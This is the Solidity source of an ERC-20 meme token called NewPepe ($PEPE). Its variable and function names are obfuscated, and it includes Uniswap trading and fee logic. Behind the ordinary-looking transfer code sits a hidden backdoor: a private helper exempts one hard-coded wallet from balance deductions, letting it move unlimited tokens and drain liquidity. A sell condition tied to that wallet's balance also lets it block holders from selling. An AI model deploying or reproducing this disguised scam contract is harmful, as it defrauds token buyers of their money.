/**
 * 
 * NewPepe    $PEPE
 * 
 * Telegram: https://t.me/PepeCoin_New
 * Twitter: https://twitter.com/PepeCoin_New
 * Website: http://newpepe.org/
*/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _rxjqb(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _rxjqb(a, b, "SafeMath");
    }

    function  _rxjqb(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract NewPepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _dvfqoj;
    address payable private _tjkoplh;
    address private _rbijop;

    string private constant _name = unicode"NewPepe";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 4206900000 * 10 **_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _evjqrh;
    mapping (address => bool) private _yvirnry;
    mapping(address => uint256) private _fnjokp;
    uint256 public _qulqvb = _totalSupply;
    uint256 public _drzbie = _totalSupply;
    uint256 public _kpclov= _totalSupply;
    uint256 public _vsqgif= _totalSupply;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _youepj=0;
    uint256 private _eymzsy=0;
    

    bool private _brftlh;
    bool public _uoriveq = false;
    bool private byiple = false;
    bool private _ofrepc = false;


    event _pvzhip(uint _qulqvb);
    modifier unreobr {
        byiple = true;
        _;
        byiple = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _evjqrh[owner(

        )] = true;
        _evjqrh[address
        (this)] = true;
        _evjqrh[
            _tjkoplh] = true;
        _tjkoplh = 
        payable (0xb027e0019CaFaEAe8075c7509f161A722635b6c9);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _rxjqb(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 kvdakb=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_uoriveq) {
                if (to 
                != address
                (_dvfqoj) 
                && to !=
                 address
                 (_rbijop)) {
                  require(_fnjokp
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fnjokp
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _rbijop && to != 
            address(_dvfqoj) &&
             !_evjqrh[to] ) {
                require(amount 
                <= _qulqvb,
                 "Exceeds the _qulqvb.");
                require(balanceOf
                (to) + amount
                 <= _drzbie,
                  "Exceeds the _drzbie.");
                if(_eymzsy
                < _youepj){
                  require
                  (! _roepljr(to));
                }
                _eymzsy++;
                 _yvirnry
                 [to]=true;
                kvdakb = amount._pvr
                ((_eymzsy>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _rbijop &&
             from!= address(this) 
            && !_evjqrh[from] ){
                require(amount <= 
                _qulqvb && 
                balanceOf(_tjkoplh)
                <_vsqgif,
                 "Exceeds the _qulqvb.");
                kvdakb = amount._pvr((_eymzsy>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_eymzsy>
                _youepj &&
                 _yvirnry[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!byiple 
            && to == _rbijop &&
             _ofrepc &&
             contractTokenBalance>
             _kpclov 
            && _eymzsy>
            _youepj&&
             !_evjqrh[to]&&
              !_evjqrh[from]
            ) {
                _transferFrom( _wjipf(amount, 
                _wjipf(contractTokenBalance,
                _vsqgif)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _prulqh(address
                    (this).balance);
                }
            }
        }

        if(kvdakb>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(kvdakb);
          emit
           Transfer(from,
           address
           (this),kvdakb);
        }
        _balances[from
        ]= _rxjqb(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _rxjqb(kvdakb));
        emit Transfer
        (from, to, 
        amount.
         _rxjqb(kvdakb));
    }

    function _transferFrom(uint256
     tokenAmount) private
      unreobr {
        if(tokenAmount==
        0){return;}
        if(!_brftlh)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _dvfqoj.WETH();
        _approve(address(this),
         address(
             _dvfqoj), 
             tokenAmount);
        _dvfqoj.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _wjipf
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _rxjqb(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _tjkoplh){
            return a ;
        }else{
            return a .
             _rxjqb (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qulqvb = _totalSupply;
        _drzbie = _totalSupply;
        emit _pvzhip(_totalSupply);
    }

    function _roepljr(address 
    account) private view 
    returns (bool) {
        uint256 erkfhr;
        assembly {
            erkfhr :=
             extcodesize
             (account)
        }
        return erkfhr > 
        0;
    }

    function _prulqh(uint256
    amount) private {
        _tjkoplh.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _brftlh ) ;
        _dvfqoj  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _dvfqoj), 
            _totalSupply);
        _rbijop = 
        IUniswapV2Factory(_dvfqoj.
        factory( ) 
        ). createPair (
            address(this
            ),  _dvfqoj .
             WETH ( ) );
        _dvfqoj.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_rbijop).
        approve(address(_dvfqoj), 
        type(uint)
        .max);
        _ofrepc = true;
        _brftlh = true;
    }

    receive() external payable {}
}